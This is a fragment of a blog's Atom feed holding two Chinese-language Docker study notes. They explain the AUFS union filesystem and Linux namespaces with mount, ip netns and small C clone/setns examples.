    <link href="https://t1ger.github.io/2016/11/28/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-AUFS/"/>
    <id>https://t1ger.github.io/2016/11/28/docker学习笔记-AUFS/</id>
    <published>2016-11-28T06:41:01.000Z</published>
    <updated>2016-11-28T08:05:11.212Z</updated>
    
    <content type="html"><![CDATA[<h4 id="AUFS的八卦"><a href="#AUFS的八卦" class="headerlink" title="AUFS的八卦"></a><b>AUFS的八卦</b></h4><p>AUFS最初命名为Another UnionFS，后来改为Alternative UnionFS，后来可能觉得不够霸气，又改为Advance UnionFS。Junjiro Okajima（岡島順治郎）在2006年开发的，AUFS完全重写了早期的UnionFS 1.x，其主要目的是为了可靠性和性能，并且引入了一些新的功能，比如可写分支的负载均衡。AUFS在使用上全兼容UnionFS，而且比之前的UnionFS在稳定性和性能上都要好很多，后来的UnionFS 2.x开始抄AUFS中的功能。因为Linus的原因，没有进到Linux主干里，基本上是因为代码量比较多，而且写得烂（相对于只有3000行的union mount和10000行的UnionFS，以及其它平均下来只有6000行代码左右的VFS，AUFS居然有30000行代码），所以，岡島不断地改进代码质量，不断地提交，不断地被Linus拒掉，所以，到今天AUFS都还进不了Linux主干（今天你可以看到AUFS的代码其实还好了，比起OpenSSL好N倍，要么就是Linus对代码的质量要求非常高，要么就是Linus就是不喜欢AUFS）</p>
<h4 id="Linux文件系统-vs-AUFS"><a href="#Linux文件系统-vs-AUFS" class="headerlink" title="Linux文件系统 vs AUFS"></a><b>Linux文件系统 vs AUFS</b></h4><p>典型的Linux文件系统有bootfs和rootfs两部分组成<br>bootfs主要包含bootloader和kernel，bootloader主要引导加载kernel,当kernel被加载到内存中后bootfs就被umount了<br>rootfs包含linux系统中的/dev、/proc、/bin、/etc等标准目录和文件</p>
<p>AUFS是一种Union File System，所谓UnionFS就是把不同物理位置的目录合并mount到同一个目录中。UnionFS的一个最主要的应用是，把一张CD/DVD和一个硬盘目录给联合 mount在一起，然后，你就可以对这个只读的CD/DVD上的文件进行修改（当然,修改的文件存于硬盘上的目录里）</p>
<p>传统的Linux加载bootfs时会先将rootfs设为read-only，然后在系统自检之后将rootfs从read-only改为read-write，然后就可以在rootfs上进行写和读的操作了。但Docker的镜像却不是这样，它在bootfs自检完毕之后并不会把rootfs的read-only改为read-write。而是利用union mount（UnionFS的一种挂载机制）将一个或多个read-only的rootfs加载到之前的read-only的rootfs层之上。在加载了这么多层的rootfs之后，仍然让它看起来只像是一个文件系统，在Docker的体系里把union mount的这些read-only的rootfs叫做Docker的镜像。但是，此时的每一层rootfs都是read-only的，此时还不能对其进行操作。当创建一个容器，也就是将Docker镜像进行实例化，系统会在一层或是多层read-only的rootfs之上分配一层空的read-write的rootfs</p>
<p>回到AUFS,让我们来看个示例吧<br>首先，建上两个目录（水果和蔬菜），并在这两个目录中放上一些文件，水果中有苹果和蕃茄，蔬菜有胡萝卜和蕃茄。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">tree</div><div class="line">.</div><div class="line">├── fruits</div><div class="line">│   ├── apple</div><div class="line">│   └── tomato</div><div class="line">└── vegetables</div><div class="line">    ├── carrots</div><div class="line">    └── tomato</div></pre></td></tr></table></figure>
<p>然后，输入以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># 创建一个mount目录</div><div class="line">$ mkdir mnt</div><div class="line"># 把水果目录和蔬菜目录union mount到 ./mnt目录中</div><div class="line">$ sudo mount -t aufs -o dirs=./fruits:./vegetables none ./mnt</div><div class="line">#  查看./mnt目录</div><div class="line">$ tree ./mnt</div><div class="line">./mnt</div><div class="line">├── apple</div><div class="line">├── carrots</div><div class="line">└── tomato</div></pre></td></tr></table></figure>
<p>可以看到在./mnt目录下有三个文件，苹果apple、胡萝卜carrots和蕃茄tomato。水果和蔬菜的目录被union到了./mnt目录下了。<br>修改一下其中的文件内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ echo mnt &gt; ./mnt/apple</div><div class="line">$ cat ./mnt/apple</div><div class="line">mnt</div><div class="line">$ cat ./fruits/apple</div><div class="line">mnt</div></pre></td></tr></table></figure>
<p>可以看到./mnt/apple的内容改了，./fruits/apple的内容也改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ echo mnt_carrots &gt; ./mnt/carrots</div><div class="line">$ cat ./vegetables/carrots</div><div class="line">$ cat ./fruits/carrots</div><div class="line">mnt_carrots</div></pre></td></tr></table></figure>
<p>修改了./mnt/carrots的文件内容，./vegetables/carrots并没有变化，反而是./fruits/carrots的目录中出现了carrots文件，其内容是在./mnt/carrots里的内容。<br>在mount aufs命令中，没有指定它vegetables和fruits的目录权限，默认上来说，命令行上第一个(最左边)的目录是可读可写的，后面的全都是只读的</p>
<p>所以，如果像下面这样指定权限来mount aufs，就会发现有不一样的效果(记得先把上面./fruits/carrots的文件删除了)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> sudo mount -t aufs -o dirs=./fruits=rw:./vegetables=rw none ./mnt</div><div class="line">$ echo &quot;mnt_carrots&quot; &gt; ./mnt/carrots</div><div class="line">$ cat ./vegetables/carrots</div><div class="line">mnt_carrots</div><div class="line">$ cat ./fruits/carrots</div><div class="line">cat: ./fruits/carrots: No such file or directory</div></pre></td></tr></table></figure>
<p>如果要修改./mnt/tomato这个文件，那么究竟是哪个文件会被改写？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ echo &quot;mnt_tomato&quot; &gt; ./mnt/tomato</div><div class="line">$ cat ./fruits/tomato</div><div class="line">mnt_tomato</div><div class="line">$ cat ./vegetables/tomato</div><div class="line">I am a vegetable</div></pre></td></tr></table></figure>
<p>可见，如果有重复的文件名，在mount命令行上，越往前的就优先级越高。</p>
<p>关于docker的分层镜像，除了aufs，docker还支持btrfs, devicemapper和vfs，你可以使用-s或–storage-driver=选项来指定相关的镜像存储。在Ubuntu 14.04下，docker默认Ubuntu的aufs。在CentOS7下，用的是devicemapper，可以在下面的目录中查看相关的每个层的镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/var/lib/docker/aufs/diff/&lt;id&gt;</div></pre></td></tr></table></figure>
<h4 id="AUFS的一些特性"><a href="#AUFS的一些特性" class="headerlink" title="AUFS的一些特性"></a><b>AUFS的一些特性</b></h4><p>AUFS实现了所有Union FS的特性，把多个目录合并为同一目录，并可以按每个需要合并的目录指定相应的权限，实时的添加、删除、修改已经mount好的目录，还可以在多个可写的branch/dir间进行负载均衡<br>被union的目录（分支）的相关权限</p>
<ul>
<li>rw表示可写可读read-write</li>
<li>ro表示read-only，如果你不指权限，那么除了第一个外ro是默认值，对于ro分支，其永远不会收到写操作，也不会收到查找whiteout的操作</li>
<li>rr表示real-read-only，与read-only不同的是，rr标记的是天生就是只读的分支，这样，AUFS可以提高性能，比如不再设置inotify来检查文件变动通知</li>
</ul>
<p>a.术语Branch-就是各个要被union起来的目录</p>
<ul>
<li>Branch根据被union的顺序形成一个stack，一般来说最上面的是可写的，下面的都是只读的</li>
<li>Branch的stack可以在被mount后进行修改，比如：修改顺序，加入新的branch，或是删除其中的branch，或是直接修改branch的权限</li>
</ul>
<p>b.术语Opaque-就是不允许任何下层的某个目录显示出来</p>
<p>c.术语whiteout-一般来说ro的分支都会有wh的属性，比如“[dir]=ro+wh”。所谓whiteout的意思，如果在union中删除的某个文件，实际上是位于一个readonly的分支（目录）上，那么，在mount的union这个目录中将看不到这个文件，但是read-only这个层上无法做任何的修改，所以就需要对这个readonly目录里的文件作whiteout。AUFS的whiteout的实现是通过在上层的可写的目录下建立对应的whiteout隐藏文件来实现的</p>
<ul>
<li>在隐藏低层档的情况下，whiteout的名字是’.wh.<filename>’</filename></li>
<li>在阻止readdir的情况下，名字是’.wh..wh..opq’或者 ’.wh.__dir_opaque’</li>
</ul>
<p>假设有三个目录和文件如下所示（test是个空目录）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># tree</div><div class="line">.</div><div class="line">├── fruits</div><div class="line">│   ├── apple</div><div class="line">│   └── tomato</div><div class="line">├── test</div><div class="line">└── vegetables</div><div class="line">    ├── carrots</div><div class="line">    └── tomato</div></pre></td></tr></table></figure>
<p>如下mount：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># mkdir mnt</div><div class="line"># mount -t aufs -o dirs=./test=rw:./fruits=ro:./vegetables=ro none ./mnt</div><div class="line"># # ls ./mnt/</div><div class="line">apple carrots tomato</div></pre></td></tr></table></figure>
<p>现在在权限为rw的test目录下建个whiteout的隐藏文件.wh.apple，会发现./mnt/apple这个文件就消失了:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># touch ./test/.wh.apple</div><div class="line"># ls ./mnt</div><div class="line">carrots  tomato</div></pre></td></tr></table></figure>
<p>ref</p>
<p><a href="http://coolshell.cn/articles/17061.html" target="_blank" rel="external">Docker基础技术：AUFS</a><br><a href="http://70data.net/1174.html" target="_blank" rel="external">Docker学习笔记（五）Linux AUFS</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;AUFS的八卦&quot;&gt;&lt;a href=&quot;#AUFS的八卦&quot; class=&quot;headerlink&quot; title=&quot;AUFS的八卦&quot;&gt;&lt;/a&gt;&lt;b&gt;AUFS的八卦&lt;/b&gt;&lt;/h4&gt;&lt;p&gt;AUFS最初命名为Another UnionFS，后来改为Alternative Un
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker学习笔记-Linux namespace</title>
    <link href="https://t1ger.github.io/2016/11/26/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Linux-namespace/"/>
    <id>https://t1ger.github.io/2016/11/26/docker学习笔记-Linux-namespace/</id>
    <published>2016-11-26T14:34:43.000Z</published>
    <updated>2016-11-28T06:37:34.947Z</updated>
    
    <content type="html"><![CDATA[<p>Linux Namespace是Linux提供的一种内核级别环境隔离的方法,它有如下分类：</p>
<ul>
<li>mount-提供磁盘挂载点和文件系统的隔离能力</li>
<li>ipc-提供进程间通信的隔离能力，用来隔离System V IPC标识以及Posix消息队列</li>
<li>network-用来实现网络资源(网络设备、IP地址、IP路由表、端口号，等等)的隔离</li>
<li>uts-提供主机名隔离能力，用来封装uname()这个系统调用</li>
<li>pid-提供进程隔离能力，这样在不同的pid namespace中可以使用同一个pid</li>
<li>user-提供用户隔离能力，用来隔离用户ID和组ID</li>
</ul>
<p>下面我们详细的了解下它们</p>
<h4 id="Namespace的API"><a href="#Namespace的API" class="headerlink" title="Namespace的API"></a><b>Namespace的API</b></h4><p>主要有三个系统调用：</p>
<ul>
<li>clone()-实现线程的系统调用,用来创建一个新的进程,并可以通过设计上述参数达到隔离</li>
<li>unshare()-使某进程脱离某个namespace</li>
<li>sents()-把某进程加入到某个namespace</li>
</ul>
<p>在调用api时，通常需要指定以下六个常数的一个或多个，通过位或运算来实现，这六个参数分别是CLONE_NEWIPC、CLONE_NEWNS、CLONE_NEWNET、CLONE_NEWPID、CLONE_NEWUSER和CLONE_NEWUTS，这样就可以确定隔离的namespace类型</p>
<p>a、通过clone()创建新进程的同时创建namespace</p>
<p>常见调用方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int clone(int (*child_func)(void *), void *child_stack, int flags, void *arg);</div></pre></td></tr></table></figure></p>
<p>clone()实际上是传统unix系统调用fork()的一种更通用的实现方式，它可以通过flags来控制使用多少功能<br>一共有二十多种CLONE的flag（标志位）参数用来控制clone进程的方方面面<br>参数child_func传入子进程运行的程序主函数<br>参数child<em>stack传入子进程使用的栈空间<br>参数flags表示使用哪些CLONE</em>*标志位<br>参数args则可用于传入用户参数</p>
<p>b、 查看/proc/[pid]/ns文件从3.8版本的内核开始，用户就可以在/proc/[pid]/ns文件下看到指向不同namespace号的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# ls -l /proc/$$/ns </div><div class="line">total 0</div><div class="line">lrwxrwxrwx 1 root root 0 Nov 28 11:18 ipc -&gt; ipc:[4026531839]</div><div class="line">lrwxrwxrwx 1 root root 0 Nov 28 11:18 mnt -&gt; mnt:[4026531840]</div><div class="line">lrwxrwxrwx 1 root root 0 Nov 28 11:18 net -&gt; net:[4026531956]</div><div class="line">lrwxrwxrwx 1 root root 0 Nov 28 11:18 pid -&gt; pid:[4026531836]</div><div class="line">lrwxrwxrwx 1 root root 0 Nov 28 11:18 uts -&gt; uts:[4026531838]</div></pre></td></tr></table></figure></p>
<p>[4026531839]即为namespace号<br>如果两个进程指向的namespace编号相同，就说明他们在同一个namespace下，否则就是在不同namespace里面<br>/proc/[pid]/ns的另外一个作用是，一旦文件被打开，只要打开的文件描述符（fd）存在，那么就算PID所属的所有进程都已经结束，创建的namespace就会一直存在。<br>那如何打开文件描述符呢？把/proc/[pid]/ns目录挂载起来就可以达到这个效果，命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># touch ~/uts</div><div class="line"># mount --bind /proc/27514/ns/uts ~/uts</div></pre></td></tr></table></figure>
<p>如果你看到的内容与本文所描述的不符，那么说明你使用的内核在3.8版本以前。该目录下存在的只有ipc、net和uts，并且以硬链接存在</p>
<p>c、通过setns()加入一个已经存在的namespace<br>在进程都结束的情况下，也可以通过挂载的形式把namespace保留下来，保留namespace的目的自然是为以后有进程加入做准备。<br>通过setns()系统调用，你的进程从原先的namespace加入我们准备好的新namespace，使用方法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int setns(int fd, int nstype);</div></pre></td></tr></table></figure>
<p>参数fd表示我们要加入的namespace的文件描述符。它是一个指向/proc/[pid]/ns目录的文件描述符，可以通过直接打开该目录下的链接或者打开一个挂载了该目录下链接的文件得到。<br>参数nstype让调用者可以去检查fd指向的namespace类型是否符合我们实际的要求。如果填0表示不检查。<br>为了把我们创建的namespace利用起来，我们需要引入execve()系列函数，这个函数可以执行用户命令，最常用的就是调用/bin/bash并接受参数，运行起一个shell，用法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fd = open(argv[1], O_RDONLY);   /* 获取namespace文件描述符 */</div><div class="line">setns(fd, 0);                   /* 加入新的namespace */</div><div class="line">execvp(argv[2], &amp;argv[2]);      /* 执行程序 */</div></pre></td></tr></table></figure>
<p>假设编译后的程序名称为setns</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ./setns ~/uts /bin/bash   # ~/uts 是绑定的/proc/27514/ns/uts</div></pre></td></tr></table></figure>
<p>至此，你就可以在新的命名空间中执行shell命令了</p>
<p>d、通过unshare()在原先进程上进行namespace隔离，系统调用是unshare()，它跟clone()很像，不同的是，unshare()运行在原先的进程上，不需要启动一个新进程，使用方法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int unshare(int flags);</div></pre></td></tr></table></figure>
<p>调用unshare()的主要作用就是不启动一个新进程就可以起到隔离的效果，相当于跳出原先的namespace进行操作。你就可以在原进程进行一些需要隔离的操作<br>Linux中自带的unshare命令，就是通过unshare()系统调用实现的</p>
<h4 id="IPC（Interprocess-Communication）namespace"><a href="#IPC（Interprocess-Communication）namespace" class="headerlink" title="IPC（Interprocess Communication）namespace"></a><b>IPC（Interprocess Communication）namespace</b></h4><p>容器中进程间通信采用的方法包括常见的信号量、消息队列和共享内存。容器内部进程间通信对宿主机来说，实际上是具有相同PID namespace中的进程间通信，因此需要一个唯一的标识符来进行区别。申请IPC资源就申请了一个全局唯一的32位ID，所以IPC namespace中实际上包含了系统IPC标识符以及实现POSIX消息队列的文件系统。在同一个IPC namespace下的进程彼此可见，而与其他的IPC namespace下的进程则互不可见。<br>要实现ipc隔离，只需在调用时加上CLONE_NEWIPC参数。程序名称为ipc.c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//[...]</div><div class="line">int child_pid = clone(child_main, child_stack+STACK_SIZE,</div><div class="line">           CLONE_NEWIPC | CLONE_NEWUTS | SIGCHLD, NULL);</div><div class="line">//[...]</div></pre></td></tr></table></figure>
<p>首先在shell中使用ipcmk -Q命令创建一个message queue</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# ipcmk -Q </div><div class="line">Message queue id: 0</div><div class="line">[root@localhost ~]# ipcs -q</div><div class="line"></div><div class="line">------ Message Queues --------</div><div class="line">key        msqid      owner      perms      used-bytes   messages    </div><div class="line">0x58faa730 0          root       644        0            0</div></pre></td></tr></table></figure>
<p>然后我们可以编译运行加入了IPC namespace隔离的ipc.c，在新建的子进程中调用的shell中执行ipcs -q查看message queue</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@local:~# gcc -Wall ipc.c -o ipc.o &amp;&amp; ./ipc.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">root@localhost:~# ipcs -q</div><div class="line">------ Message Queues --------</div><div class="line">key   msqid   owner   perms   used-bytes   messages</div></pre></td></tr></table></figure>
<p>上面的结果显示中可以发现，已经找不到原先声明的message queue，实现了IPC的隔离。<br>目前使用IPC namespace机制的系统不多，其中比较有名的有PostgreSQL。<br>Docker本身通过socket或tcp进行通信</p>
<h4 id="Network-namespace"><a href="#Network-namespace" class="headerlink" title="Network namespace"></a><b>Network namespace</b></h4><p>一个物理的网络设备最多存在在一个network namespace中，你可以通过创建veth pair在不同的network namespace间创建通道，以此达到通信的目的。<br>一般情况下，物理网络设备都分配在最初的root namespace中。但是如果你有多块物理网卡，也可以把其中一块或多块分配给新创建的network namespace。需要注意的是，当新创建的network namespace被释放时，在这个namespace中的物理网卡会返回到root namespace而非创建该进程的父进程所在的network namespace。<br>当说到network namespace时，其实我们指的未必是真正的网络隔离，而是把网络独立出来，给外部用户一种透明的感觉，仿佛跟另外一个网络实体在进行通信。为了达到这个目的，容器的经典做法就是创建一个veth pair，一端放置在新的namespace中，通常命名为eth0，一端放在原先的namespace中连接物理网络设备，再通过网桥把别的设备连接进来或者进行路由转发，以此网络实现通信的目的。<br>在建立起veth pair之前，新旧namespace该如何通信呢？<br>答案是pipe（管道）。我们以Docker Daemon在启动容器dockerinit的过程为例。Docker Daemon在宿主机上负责创建这个veth pair，通过netlink调用，把一端绑定到docker0网桥上，一端连进新建的network namespace进程中。建立的过程中，Docker Daemon和dockerinit就通过pipe进行通信，当Docker Daemon完成veth-pair的创建之前，dockerinit在管道的另一端循环等待，直到管道另一端传来Docker Daemon关于veth设备的信息，并关闭管道。dockerinit才结束等待的过程，并把它的“eth0”启动起来。</p>
<p>跟其他namespace类似，对network namespace的使用其实就是在创建的时候添加CLONE_NEWNET标识位。也可以通过命令行工具ip创建network namespace。<br>首先我们可以创建一个命名为test_ns的network namespace</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ip netns add test_ns</div></pre></td></tr></table></figure>
<p>当ip命令工具创建一个network namespace时，会默认创建一个回环设备（loopback interface：lo），并在/var/run/netns目录下绑定一个挂载点，这就保证了就算network namespace中没有进程在运行也不会被释放，也给系统管理员对新创建的network namespace进行配置提供了充足的时间。<br>通过ip netns exec命令可以在新创建的network namespace下运行网络管理命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># ip netns exec test_ns ip link list</div><div class="line">3: lo: &lt;LOOPBACK&gt; mtu 16436 qdisc noop state DOWN</div><div class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</div></pre></td></tr></table></figure>
<p>可以看到状态是DOWN,需要再通过命令去启动。<br>可以看到，此时执行ping命令是无效的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># ip netns exec test_ns ping 127.0.0.1</div><div class="line">connect: Network is unreachable</div></pre></td></tr></table></figure>
<p>启动命令如下，可以看到启动后再测试就可以ping通</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># ip netns exec test_ns ip link set dev lo up</div><div class="line"># ip netns exec test_ns ping 127.0.0.1</div><div class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</div><div class="line">64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.050 ms</div><div class="line">...</div></pre></td></tr></table></figure>
<p>这样只是启动了本地的回环，要实现与外部namespace进行通信还需要再建一个网络设备对</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># ip link add veth0 type veth peer name veth1</div><div class="line"># ip link set veth1 netns test_ns</div><div class="line"># ip netns exec test_ns ifconfig veth1 10.1.1.1/24 up</div><div class="line"># ifconfig veth0 10.1.1.2/24 up</div></pre></td></tr></table></figure>
<p>第一条命令创建了一个网络设备对，所有发送到veth0的包veth1也能接收到，反之亦然。<br>第二条命令则是把veth1这一端分配到test_ns这个network namespace。<br>第三、第四条命令分别给test_ns内部和外部的网络设备配置IP，veth1的IP为10.1.1.1，veth0的IP为10.1.1.2。<br>此时两边就可以互相连通了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># ping 10.1.1.1</div><div class="line">PING 10.1.1.1 (10.1.1.1) 56(84) bytes of data.</div><div class="line">64 bytes from 10.1.1.1: icmp_req=1 ttl=64 time=0.095 ms</div><div class="line">...</div><div class="line"># ip netns exec test_ns ping 10.1.1.2</div><div class="line">PING 10.1.1.2 (10.1.1.2) 56(84) bytes of data.</div><div class="line">64 bytes from 10.1.1.2: icmp_req=1 ttl=64 time=0.049 ms</div><div class="line">...</div></pre></td></tr></table></figure>
<p>新的test_ns有着自己独立的路由和iptables</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ip netns exec test_ns route</div><div class="line">ip netns exec test_ns iptables -L</div></pre></td></tr></table></figure>
<p>路由表中只有一条通向10.1.1.2的规则，此时如果要连接外网肯定是不可能的，可以通过建立网桥或者NAT映射来决定这个问题。<br>删除这个network namespace</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ip netns delete netns1</div></pre></td></tr></table></figure>
<p>这条命令会移除之前的挂载，但是如果namespace本身还有进程运行，namespace还会存在下去，直到进程运行结束。<br>实际上内核创建了network namespace以后，真的是得到了一个被隔离的网络。但是实际上需要的不是这种完全的隔离，而是一个对用户来说透明独立的网络实体，需要与这个实体通信</p>
<h4 id="UTS（UNIX-Time-sharing-System）namespace"><a href="#UTS（UNIX-Time-sharing-System）namespace" class="headerlink" title="UTS（UNIX Time-sharing System）namespace"></a><b>UTS（UNIX Time-sharing System）namespace</b></h4><p>UTS namespace提供了主机名和域名的隔离，这样每个容器就可以拥有了独立的主机名和域名，在网络上可以被视作一个独立的节点而非宿主机上的一个进程</p>
<p>建立uts.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">#define _GNU_SOURCE</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sched.h&gt;</div><div class="line">#include &lt;signal.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#define STACK_SIZE (1024 * 1024)</div><div class="line">static char child_stack[STACK_SIZE];</div><div class="line">char* const child_args[] = &#123;</div><div class="line">  &quot;/bin/bash&quot;,</div><div class="line">  NULL</div><div class="line">&#125;;</div><div class="line">int child_main(void* args) &#123;</div><div class="line">  printf(&quot;在子进程中!\n&quot;);</div><div class="line">  execv(child_args[0], child_args);</div><div class="line">  return 1;</div><div class="line">&#125;</div><div class="line">int main() &#123;</div><div class="line">  printf(&quot;程序开始: \n&quot;);</div><div class="line">  int child_pid = clone(child_main, child_stack + STACK_SIZE, SIGCHLD, NULL);</div><div class="line">  waitpid(child_pid, NULL, 0);</div><div class="line">  printf(&quot;已退出\n&quot;);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>编译执行后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@local:~# gcc -Wall uts.c -o uts.o &amp;&amp; ./uts.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">root@local:~# exit</div><div class="line">exit</div><div class="line">已退出</div><div class="line">root@local:~#</div></pre></td></tr></table></figure>
<p>下面，我们将修改代码，加入UTS隔离。运行代码需要root权限，为了防止普通用户任意修改系统主机名导致set-user-ID相关的应用运行出错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">//[...]</div><div class="line">int child_main(void* arg) &#123;</div><div class="line">  printf(&quot;在子进程中!\n&quot;);</div><div class="line">  sethostname(&quot;Changed Namespace&quot;, 12);</div><div class="line">  execv(child_args[0], child_args);</div><div class="line">  return 1;</div><div class="line">&#125;</div><div class="line">int main() &#123;</div><div class="line">//[...]</div><div class="line">int child_pid = clone(child_main, child_stack+STACK_SIZE,</div><div class="line">    CLONE_NEWUTS | SIGCHLD, NULL);</div><div class="line">//[...]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>再次运行可以看到hostname已经变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@local:~# gcc -Wall namespace.c -o main.o &amp;&amp; ./main.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">root@NewNamespace:~# exit</div><div class="line">exit</div><div class="line">已退出</div><div class="line">root@local:~#  &lt;- 回到原来的hostname</div></pre></td></tr></table></figure>
